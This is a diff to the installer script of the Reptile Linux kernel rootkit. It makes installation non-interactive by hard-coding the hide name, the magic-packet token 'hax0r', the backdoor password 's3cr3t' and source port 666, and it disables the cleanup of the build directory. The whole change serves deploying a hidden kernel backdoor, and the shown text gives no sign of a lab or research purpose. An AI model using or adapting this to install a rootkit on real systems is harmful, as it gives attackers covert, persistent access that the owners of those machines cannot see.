@@ -114,25 +114,26 @@ function random_gen {
 	fi
 }
 
+#SB: Modify function to install non-interactively
 function config_gen {
 	load_config "Hide name (will be used to hide dirs/files)" "reptile"
-	MODULE=$RETVAL
+	MODULE="reptile"
 	DRIVER_DIRECTORY="/lib/modules/$KERNEL_VERSION/kernel/drivers/$DRIVER/$MODULE"
 
 	load_config "Auth token to magic packets" "hax0r"
-	TOKEN=$RETVAL
+	TOKEN="hax0r"
 
 	load_config "Backdoor password" "s3cr3t"
-	PASS=$RETVAL
+	PASS="s3cr3t"
 
 	load_config "Tag name that hide file contents" "reptile"
-	TAG=$RETVAL
+	TAG="reptile"
 
 	load_config "Source port of magic packets" "666"
-	SRCPORT=$RETVAL
+	SRCPORT="666"
 
 	load_config "Would you like to config reverse shell each X time? (y/n)" "n"
-	RSH=$RETVAL
+	RSH="n"
 
 	if [ "$RSH" == "y" ] || [ "$RSH" == "Y" ]; then
 		load_config "Reverse IP"
@@ -288,8 +289,8 @@ function reptile_install {
 	echo -e "\e[01;36mDONE!\e[00m\n" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
 	rm -f loader
 
-	directory_remove
-	echo -e "\nInstalation has finished!\n"
+#	directory_remove
+	echo -e "\nInstallation has finished!\n"
 }
 
 function reptile_remove {
@@ -321,7 +322,7 @@ function reptile_remove {
 	rm -rf $DRIVER_DIRECTORY && \
 	echo -e "\e[01;36mDONE!\e[00m\n" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
 
-	directory_remove
+#	directory_remove
 	echo
 
 	read -p "Reboot? (Y/N) [default: N]: "
